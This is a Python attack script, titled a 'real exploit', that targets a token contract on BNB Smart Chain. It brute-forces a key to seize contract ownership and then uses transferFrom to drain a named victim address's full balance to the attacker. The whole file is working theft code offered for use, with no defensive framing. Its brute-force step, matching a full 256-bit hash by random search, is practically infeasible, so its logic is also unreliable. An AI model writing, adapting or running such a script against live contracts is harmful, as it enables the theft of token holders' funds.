from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_account import Account
from eth_utils import keccak
import secrets

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Real Exploit for Vulnerable Token")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# ===== TOKEN ABI =====
TOKEN_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

def generate_matching_address(target_hash):
    """Generate an address where keccak256(address) == target_hash"""
    print(f"\n[+] Generating address matching hash: {target_hash}")
    attempts = 0
    while True:
        priv = secrets.token_hex(32)
        acct = Account.from_key(priv)
        addr_hash = int.from_bytes(keccak(hexstr=acct.address[2:]), 'big')
        attempts += 1
        if attempts % 100000 == 0:
            print(f"Attempts: {attempts}")
        if addr_hash == target_hash:
            print(f"[+] Found matching address after {attempts} attempts")
            print(f"[+] Address: {acct.address}")
            print(f"[+] Private key: {priv}")
            return acct

def execute_exploit():
    """Full exploit execution"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    # Get target hash from contract
    target_hash = token.functions._maxSupply().call()
    
    # Generate matching address (this may take time)
    attacker_account = generate_matching_address(target_hash)
    
    print(f"\n[+] Target Contract: {args.token_address}")
    print(f"[+] Attacker Address: {attacker_account.address}")
    print(f"[+] Victim Address: {args.victim_address}")
    
    # Step 1: Claim ownership
    print("\n[1] Claiming ownership...")
    try:
        tx = token.functions.isOwner(attacker_account.address).build_transaction({
            'from': attacker_account.address,
            'nonce': w3.eth.get_transaction_count(attacker_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        signed = attacker_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
        if receipt.status != 1:
            print("[-] Ownership claim failed")
            return
    except Exception as e:
        print(f"[-] Error claiming ownership: {str(e)}")
        return
    
    # Wait for state update
    time.sleep(10)
    
    # Step 2: Drain victim's balance
    print("\n[2] Draining victim balance...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    
    try:
        tx = token.functions.transferFrom(
            args.victim_address,
            attacker_account.address,
            victim_bal
        ).build_transaction({
            'from': attacker_account.address,
            'nonce': w3.eth.get_transaction_count(attacker_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        
        signed = attacker_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print("\n[+] Exploit Results:")
        print(f"TX Hash: {tx_hash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")
        print(f"New Victim Balance: {token.functions.balanceOf(args.victim_address).call()}")
    except Exception as e:
        print(f"[-] Transfer failed: {str(e)}")

if __name__ == "__main__":
    execute_exploit()
